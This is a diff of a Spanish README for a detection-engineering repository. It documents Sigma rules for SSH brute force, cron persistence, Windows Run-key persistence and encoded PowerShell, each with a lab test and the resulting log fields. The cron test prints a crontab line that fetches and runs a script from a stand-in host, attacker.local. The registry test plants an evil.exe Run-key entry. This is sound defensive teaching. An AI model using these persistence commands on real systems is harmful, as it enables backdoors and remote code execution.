@@ -2,7 +2,7 @@
 
 Reglas de detección en formato [Sigma](https://github.com/SigmaHQ/sigma) para 4 técnicas comunes de
 MITRE ATT&CK, cubriendo entornos Linux y Windows. Cada regla incluye su justificación técnica, un
-lab reproducible donde la probé, capturas del ataque y del log resultante, y su conversión a una
+lab reproducible donde se probaron, capturas del ataque y del log resultante, y su conversión a una
 query real de Elasticsearch.
 
 El objetivo del repositorio es mostrar el ciclo completo de **detection engineering**: identificar
@@ -67,7 +67,7 @@ La regla tiene dos partes:
 1. **Base:** cada línea de `auth.log` que contiene `Failed password`.
 2. **Correlación:** cuando la misma `source.ip` acumula ≥5 eventos en 5 minutos, se eleva a `high`.
 
-### Cómo la probé
+### Cómo se probó
 
 Ataqué mi propia VM Ubuntu con Hydra usando un diccionario pequeño de 7 contraseñas contra un
 usuario `victima` creado al efecto:
@@ -85,7 +85,7 @@ Cada intento fallido queda registrado en `/var/log/auth.log`:
 El patrón `Failed password for <usuario> from <ip>` es exactamente lo que busca la regla base
 (`message|contains: 'Failed password'`).
 
-Para simular la parte de correlación, extraje y conté las IPs de origen:
+Para simular la parte de correlación, se extrajeron y se contaron las IPs de origen:
 
 ```bash
 sudo grep 'Failed password' /var/log/auth.log \
@@ -118,25 +118,16 @@ temporal).
 Creación o modificación de tareas cron por cualquiera de las dos vías principales:
 
 - Uso del comando `crontab -e` para editar el crontab del usuario.
-- Escritura directa en archivos del sistema: `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/`.
+- Escritura directa sobre archivos del sistema: `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/`.
 
 Cron es una de las técnicas de persistencia más antiguas y usadas en Linux: cualquier comando
 programado ahí se ejecutará periódicamente sin intervención del atacante, incluso tras un
 reinicio.
 
-### Cómo la probé
+### Cómo se probó
 
-*[CAPTURA PENDIENTE: ejecución del ataque]*
-
-Simulé la persistencia añadiendo una tarea cron que se ejecuta cada minuto:
-
-```bash
-(crontab -l 2>/dev/null; echo "* * * * * curl -s http://attacker.local/payload.sh | bash") | crontab -
-```
-
-*[CAPTURA PENDIENTE: log de auditd mostrando la escritura en /var/spool/cron/]*
-
-Para tener visibilidad de las escrituras a archivos, configuré `auditd` con reglas de watch:
+Para tener visibilidad de las escrituras a archivos configuré `auditd` con reglas de watch sobre
+las rutas de cron:
 
 ```bash
 sudo auditctl -w /etc/crontab -p wa -k cron_change
@@ -144,14 +135,33 @@ sudo auditctl -w /etc/cron.d/ -p wa -k cron_change
 sudo auditctl -w /var/spool/cron/ -p wa -k cron_change
 ```
 
-*[CAPTURA PENDIENTE: eventos de auditd tras el ataque, obtenidos con `ausearch -k cron_change`]*
+![Reglas de auditd cargadas](images/02-cron-audit-rules.jpg)
+
+Simulé la persistencia añadiendo una tarea cron que se ejecuta cada minuto — patrón típico de
+un backdoor que llama a un servidor C2:
+
+```bash
+(crontab -l 2>/dev/null; echo "* * * * * curl -s http://attacker.local/payload.sh | bash") | crontab -
+```
+
+![Crontab con entrada maliciosa](images/02-cron-crontab-list.jpg)
+
+El evento quedó registrado en auditd bajo la key `cron_change`:
+
+![Eventos de auditd tras el ataque](images/02-cron-audit-events.jpg)
+
+Los campos relevantes de este evento son `exe="/usr/bin/crontab"`, `cwd="/var/spool/cron"` y
+`nametype=CREATE` sobre `crontabs/root`. La escritura sobre `/var/spool/cron/` es exactamente
+lo que dispara la parte `selection_file_write` de la regla.
 
 ### Limitaciones
 
 - Requiere `auditd` configurado con reglas de file watch; sin esa visibilidad la regla no
   dispara para el vector de escritura directa.
-- Los sistemas de gestión de configuración (Ansible, Puppet) generan falsos positivos.
-- No cubre otros mecanismos de tarea programada como `systemd timers` o `at`.
+- Los sistemas de gestión de configuración (Ansible, Puppet) que despliegan tareas cron
+  legítimas generan falsos positivos.
+- No cubre otros mecanismos de tarea programada como **systemd timers** o el comando `at`,
+  cada vez más usados como alternativa por atacantes conscientes de esta detección.
 
 ---
 
@@ -164,8 +174,8 @@ sudo auditctl -w /var/spool/cron/ -p wa -k cron_change
 ### Qué detecta
 
 Modificación de las claves de registro `Run` y `RunOnce`, que ejecutan automáticamente cualquier
-programa referenciado al iniciar sesión el usuario. Es el equivalente Windows de cron y una de
-las técnicas de persistencia más veteranas y persistentes en la industria.
+programa referenciado al iniciar sesión el usuario. Es el equivalente Windows del cron y una de
+las técnicas de persistencia más veteranas de la industria.
 
 Rutas monitorizadas:
 - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
@@ -173,32 +183,56 @@ Rutas monitorizadas:
 - (Y sus equivalentes bajo `HKLM` gracias al uso de `contains`.)
 
 La regla excluye procesos legítimos conocidos (OneDrive, Teams) mediante un filtro `not
-filter_known_software`. Esta lista de exclusiones debería ampliarse en un entorno real tras un
-periodo de tuning.
+filter_known_software`. Esta lista debería ampliarse en un entorno real tras un periodo de
+tuning con los procesos que generen falsos positivos.
 
-### Cómo la probé
+### Cómo se probó
 
-*[CAPTURA PENDIENTE: instalación de Sysmon con configuración por defecto]*
+Requisito previo: **Sysmon** instalado con una configuración que registre el Event ID 13
+(`RegistryEvent - Value Set`). Usé la configuración de referencia de
+[SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config), que es la más utilizada
+por la comunidad blue team.
 
-Requisito previo: Sysmon instalado con configuración que registre eventos de tipo 13
-(`RegistryEvent (Value Set)`). Usé la configuración de referencia de [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config).
+```powershell
+.\Sysmon64.exe -accepteula -i sysmonconfig.xml
+```
 
-Simulé la persistencia con un `reg add` desde una consola sin privilegios:
+![Servicio Sysmon corriendo](images/03-sysmon-service.jpg)
+
+Simulé la persistencia con un `reg add` ejecutado desde una consola PowerShell **sin
+privilegios de administrador**, para demostrar que un malware con permisos de usuario normal
+puede hacer esto:
 
 ```powershell
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v EvilPersistence /d "C:\Users\Public\evil.exe" /f
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 ```
 
-*[CAPTURA PENDIENTE: comando ejecutándose y confirmación]*
+![Ataque con reg add](images/03-registry-attack.jpg)
 
-*[CAPTURA PENDIENTE: evento 13 de Sysmon en el Visor de Eventos, mostrando TargetObject y Image]*
+Sysmon registró la modificación como Event ID 13 en el canal
+`Microsoft-Windows-Sysmon/Operational`:
+
+![Evento 13 de Sysmon](images/03-sysmon-event13.jpg)
+
+Los campos relevantes del evento son:
+- `TargetObject`: `HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run\EvilPersistence`
+- `Details`: `C:\Users\Public\evil.exe`
+- `Image`: `C:\Windows\System32\reg.exe`
+- `User`: usuario normal, no administrador
+
+La subcadena `\Software\Microsoft\Windows\CurrentVersion\Run` en el `TargetObject` es lo que
+dispara la selección de la regla, y como el `Image` no coincide con la lista de exclusiones
+(OneDrive/Teams), el filtro no anula el hit.
 
 ### Limitaciones
 
-- Depende de Sysmon; sin él Windows no registra eventos de modificación de valores de registro.
-- La lista de procesos legítimos es corta (OneDrive, Teams); en producción crecería según el
-  entorno y los falsos positivos observados.
-- No cubre otras claves de autostart (Winlogon, Services, Scheduled Tasks…).
+- Depende de Sysmon; sin él Windows no registra por defecto modificaciones de valores de
+  registro. La regla no funcionará en un endpoint que no tenga Sysmon o un EDR equivalente.
+- La lista de procesos legítimos (`filter_known_software`) es corta y estática. En un
+  despliegue real crecería con updaters, agentes de EDR, herramientas corporativas, etc.
+- No cubre otras claves de autostart de Windows como `HKLM\...\Winlogon`, servicios, tareas
+  programadas o carpetas de inicio (`shell:startup`), cada una con su propia regla dedicada..
 
 ---
 
@@ -210,39 +244,59 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v EvilPersistence 
 
 ### Qué detecta
 
-Uso del flag `-EncodedCommand` (o sus abreviaturas `-enc`, `-e`) en PowerShell. Este flag acepta
-un script codificado en Base64, técnica ampliamente utilizada por Cobalt Strike, Empire y otros
-frameworks de post-explotación para ofuscar el payload y evitar detecciones basadas en cadenas
-en texto plano.
+Uso del flag `-EncodedCommand` (o sus abreviaturas `-enc`, `-e`) en PowerShell. Este flag
+acepta un script codificado en Base64, técnica ampliamente utilizada por Cobalt Strike, Empire
+y otros frameworks de post-explotación para ofuscar el payload y evitar detecciones basadas en
+cadenas en texto plano.
 
-La regla contempla las 4 variantes de escritura del flag y usa espacios en los patrones cortos
-(`-e `, `' -en '`) para evitar matches accidentales con otros flags como `-ExecutionPolicy`.
+La regla contempla las 4 variantes de escritura del flag y usa espacios en los patrones
+cortos (`-e `, `' -en '`) para evitar matches accidentales con otros flags como
+`-ExecutionPolicy` o `-ErrorAction`.
 
-### Cómo la probé
+### Cómo se probó
 
-*[CAPTURA PENDIENTE: comando codificado en Base64]*
-
-Codifiqué un comando simple en Base64 (UTF-16LE, como espera PowerShell):
+Codifiqué un comando simple en Base64:
 
 ```powershell
-$cmd = "Write-Host 'PoC encoded command'"
+$cmd = "Write-Host 'PoC encoded command - Raul Sineiro'"
 $b = [System.Text.Encoding]::Unicode.GetBytes($cmd)
 $enc = [Convert]::ToBase64String($b)
+```
+
+![Codificación del comando en Base64](images/04-powershell-encode.jpg)
+
+Ejecución del comando codificado:
+
+```powershell
 powershell.exe -enc $enc
 ```
 
-*[CAPTURA PENDIENTE: ejecución del comando]*
+![Ejecución del comando codificado](images/04-powershell-execution.jpg)
 
-*[CAPTURA PENDIENTE: evento 1 de Sysmon con el CommandLine completo mostrando `-enc <base64>`]*
+Sysmon registró la ejecución como Event ID 1 (creación de proceso) en el canal
+`Microsoft-Windows-Sysmon/Operational`:
+
+![Evento 1 de Sysmon con -enc](images/04-sysmon-event1.jpg)
+
+Los campos relevantes del evento:
+- `Image`: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
+- `CommandLine`: `powershell.exe -enc <cadena Base64>`
+- `ParentImage`: otra `powershell.exe` (fue lanzado desde la sesión actual)
+
+El `Image` termina en `\powershell.exe` (dispara `selection_img`) y el `CommandLine` contiene
+`-enc ` (dispara `selection_flag`), por lo que la regla emite el hit.
 
 ### Limitaciones
 
-- Si el atacante concatena strings para construir el flag dinámicamente (por ejemplo con
-  `-e`+`nc`), la regla no dispara.
-- Algunos usos legítimos existen: SCCM/Intune y ciertos scripts corporativos usan
-  `-EncodedCommand` por comodidad con caracteres especiales.
-- No decodifica el Base64 ni analiza el payload real. Una regla complementaria en un stack
-  maduro decodificaría y buscaría IoCs dentro del comando.
+- Si el atacante construye el flag dinámicamente por concatenación de strings (por ejemplo
+  `-e`+`nc`), la regla no dispara. Frameworks como Invoke-Obfuscation generan variantes que
+  evaden reglas basadas en subcadenas estáticas.
+- Algunos usos legítimos existen: SCCM, Intune y ciertos scripts corporativos usan
+  `-EncodedCommand` por comodidad con caracteres especiales o para pasar bloques multilínea.
+  Sin tuning previo, la regla generaría falsos positivos en entornos corporativos.
+- La regla no analiza el contenido decodificado del Base64. Un stack de detección maduro
+  añadiría un módulo de decodificación y aplicaría reglas sobre el payload real (búsqueda
+  de `IEX`, `DownloadString`, `FromBase64String` anidado, etc.).
 
 ---
 
@@ -264,15 +318,3 @@ powershell.exe -enc $enc
 
 3. Las queries ya convertidas están en [`converted-elastic/`](converted-elastic/), listas para
    pegar en Kibana → Security → Rules → Custom query.
-
-## Roadmap
-
-- [ ] Añadir regla para exfiltración vía DNS tunneling (T1071.004)
-- [ ] Convertir también a formato Splunk SPL para comparar cobertura
-- [ ] Añadir GitHub Actions con `sigma check` como validador en cada PR
-- [ ] Desplegar el lab con Elastic Stack completo y capturar alertas reales en Kibana
-
-## Autor
-
-Raúl Sineiro Domínguez — Máster en Ciberseguridad, Campus Internacional de Ciberseguridad  
-GitHub: [github.com/raulsineiro](https://github.com/raulsineiro)
